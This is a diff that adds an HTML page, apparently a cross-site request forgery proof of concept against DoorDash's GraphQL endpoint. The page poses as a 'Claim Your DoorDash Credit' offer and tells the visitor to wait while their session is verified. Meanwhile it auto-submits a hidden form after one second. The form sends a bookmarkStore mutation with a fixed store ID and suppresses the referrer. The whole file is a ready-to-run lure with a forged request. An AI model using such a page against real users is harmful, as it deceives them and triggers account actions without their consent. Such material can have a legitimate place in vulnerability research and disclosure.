@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Claim Your DoorDash Credit</title>
+    <meta name="referrer" content="no-referrer">
+</head>
+<body>
+    <h1>Processing...</h1>
+    <p>Please do not close this window while we verify your session.</p>
+
+    <form id="csrfForm" action="https://www.doordash.com/graphql/bookmarkStore" method="POST">
+        <input type="hidden" name="_method" value="GET">
+        
+        <input type="hidden" name="operationName" value="bookmarkStore">
+        <input type="hidden" name="query" value="mutation bookmarkStore($storeId: ID!) { bookmarkStore(storeId: $storeId) }">
+        
+        <input type="hidden" name="variables" value='{"storeId":"29651605"}'>
+    </form>
+
+    <script>
+        // Auto-submit the form after 1 second
+        setTimeout(function() {
+            document.getElementById("csrfForm").submit();
+        }, 1000);
+    </script>
+</body>
+</html>
